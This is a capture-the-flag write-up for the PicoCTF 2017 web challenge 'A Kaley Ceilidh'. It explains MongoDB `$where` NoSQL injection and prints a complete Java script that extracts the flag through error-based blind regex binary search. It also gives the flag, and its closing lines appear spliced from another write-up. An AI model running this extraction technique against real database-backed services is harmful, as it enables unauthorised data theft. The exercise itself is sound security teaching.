# PicoCTF_2017: A Kaley Ceilidh

**Category:** Web Exploitation
**Points:** 175
**Description:**

>Everyone loves Scottish food [citation needed], but do you ever wish there were more hipster-y options? Well look no further than a [Kaley Ceilidh](http://shell2017.picoctf.com:8080/).

**Hint:**

>There's not a whole lot you can do on this application. If your normal attacks aren't working, perhaps you need to think bigger. Humongous, in fact.
The server probably won't show you anything that contains a "flag" property.

## Write-up
First we had to realize this Node server utilizes Mongodb (The hint says to think HuMONGOus). This meant that our SQL injection techniques will not work for this. For this we had to use a new type of injection called "no-sql" injection. The problem arises because the server will reject any nested object JSON queries that we make.

At first, it seems totally safe (most special quereies require a nested object construct), except for one. The  `$where`  directive allows you to execute arbitrary filtering code (javascript code). Most APIs are blocked in this javascript sandbox, so we couldn't edit the query and have it return our flag.

However, we still had one bit of data that could give us the flag (indirectly). When the executed javascript runs into an error, the server actually returns  `Error`  instead of an empty query. This allows us to create a narrowline distinction between whether if the flag, say matches a particular pattern, and whether it doesn't. Our solution involves using a binary search using regex as our method of testing whether if the flag matches a pattern.

The Java code that executes this binary search is of below:
```java
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;

public class Kaley
{
	public static URL web;
	public static boolean test(String flag) throws Exception
	{
		HttpURLConnection conn = (HttpURLConnection)web.openConnection();
		conn.setDoOutput(true);
		conn.setDoInput(true);
		conn.setUseCaches(false);
		conn.setRequestMethod("POST");
		conn.setRequestProperty("Content-Type", "application/json");
		conn.connect();
		
		OutputStream os = conn.getOutputStream();
		OutputStreamWriter osw = new OutputStreamWriter(os, "UTF-8");
		osw.write("{\"$where\": \"if (this.flag && /^flag{" + flag + "[A-Za-z0-9_]*}$/.test(this.flag)) throw 3\"}");
		osw.flush();
		osw.close();
		
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader( conn.getInputStream(),"utf-8"));
		String line = null;
		while ((line = br.readLine()) != null) {
		    sb.append(line + "\n");
		}
		br.close();
		return (sb.toString().equals("Error\n"));
	}
	
	public static char binarySearch(String before, char from, char to) throws Exception
	{
		while (from < to)
		{
			char mid = (char)((from + to) / 2);
			if (test(before + "[" + from + "-" + mid + "]"))
				to = mid;
			else
				from = (char)(mid + 1);
		}
		return to;
	}
	
	public static void main(String[] args) throws Exception
	{
		web = new URL("http://shell2017.picoctf.com:8080/search");
		
		String flag = "";
		for (int i = 0; i < 25; i++)
		{
			char res;
			if (test(flag + "[A-Z]"))
				res = binarySearch(flag, 'A', 'Z');
			else if (test(flag + "[0-9]"))
				res = binarySearch(flag, '0', '9');
			else if (test(flag + "[a-z]"))
				res = binarySearch(flag, 'a', 'z');
			else 
				res = '_';
			flag += res;
			System.out.print(res);
		}
		System.out.println();
		System.out.println("flag{" + flag + "}");
	}

}
```

Therefore, the flag is `flag{I_only_eat_0rg4n1c_flages}`.

Also useful one https://github.com/BOAKGP/CTF-Writeups/tree/master/PicoCTF%202017/Level%204/Web%20Exploitation/A%20Kaley%20Ceilidhrom the clue given, this is a common(_not really_) case of MongoDB exploitation. The basis of this exploit revolves around MongoDB's magical `$where` function followed by a slow bruteforce with time-based blind exploits.

[Python Script](solve.py)

Therefore, the flag is `flag{I_only_eat_0rg4n1c_flages}`.
<!--stackedit_data:
eyJoaXN0b3J5IjpbMzg2MjM0MjMxLC0xOTA1NzM5NDM2LC0yNz
c0OTI4OV19
-->